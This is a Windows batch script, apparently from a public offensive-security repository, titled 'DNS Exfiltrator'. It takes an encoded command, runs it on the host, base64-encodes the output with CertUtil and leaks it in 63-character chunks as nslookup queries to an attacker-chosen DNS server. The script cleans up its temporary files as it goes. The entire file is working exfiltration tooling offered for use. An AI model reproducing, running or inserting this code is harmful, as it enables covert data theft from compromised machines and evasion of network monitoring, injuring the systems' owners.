:: Copyright (c) 2021 Ivan Šincek

@echo off
setlocal EnableDelayedExpansion
	echo #######################################################################
	echo #                                                                     #
	echo #                           DNS Exfiltrator v1.1                      #
	echo #                                      by Ivan Sincek                 #
	echo #                                                                     #
	echo # Exfiltrate data with DNS query.                                     #
	echo # GitHub repository at github.com/ivan-sincek/dns-exfiltrator.        #
	echo # Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #
	echo #                                                                     #
	echo #######################################################################
	set error=false
	call :validate error %1
	call :validate error %2
	if "!error!" EQU "true" (
		echo Usage: dns_exfiltrator.bat ^<enc-command^> ^<dns-server^>
	) else (
		call :exfiltrate %1 %2
	)
endlocal
exit /b 0

:: %1 (required) - error (out)
:: %2 (required) - encoded command
:validate
	if "%~2" EQU "" (
		set %1=true
	)
	exit /b 0

:: %1 (required) - payload
:: %2 (required) - dns server
:send
	setlocal EnableDelayedExpansion
		set data=%1
		set /a count=0
		:while
			set chunk=!data:~%count%,63!
			set /a count=%count%+63
			if "!chunk!" NEQ "" (
				nslookup -retry=5 -timeout=5 -type=a !chunk!.%2
				:: just a little timeout to prevent the race condition while sending queries
				timeout /t 2 /nobreak 1>nul 2>nul
				goto :while
			)
	endlocal
	exit /b 0

:: %1 (required) - encoded command
:: %2 (required) - dns server
:exfiltrate
	setlocal EnableDelayedExpansion
		set enc=dns_exfil_enc.txt
		set dec=dns_exfil_dec.txt
		echo %~1 > "%enc%"
		CertUtil -f -decode "%enc%" "%dec%" 1>nul 2>nul
		del /f /q "%enc%" 1>nul 2>nul
		if not exist "%dec%" (
			echo Cannot decode the encoded command
		) else (
			for /f "tokens=*" %%i in (%dec%) do (
				set cmd=%%i
			)
			del /f /q "%dec%" 1>nul 2>nul
			for /f "tokens=*" %%i in ('!cmd!') do (
				echo %%i >> "%dec%"
			)
			CertUtil -f -encode "%dec%" "%enc%" 1>nul 2>nul
			del /f /q "%dec%" 1>nul 2>nul
			if not exist "%enc%" (
				echo Cannot encode the output
			) else (
				for /f "tokens=*" %%i in (%enc%) do (
					set payload=!payload!%%i
				)
				del /f /q "%enc%" 1>nul 2>nul
				set payload=!payload:~27,-25!
				:: replace "+" with "plus"
				set payload=!payload:+=plus!
				:: replace "/" with "slash"
				set payload=!payload:/=slash!
				:: remove padding "="
				for /f "tokens=1 delims=^=" %%i in ("!payload!") do (
					set payload=%%i
				)
				call :send !payload! %2
			)
		)
	endlocal
	exit /b 0
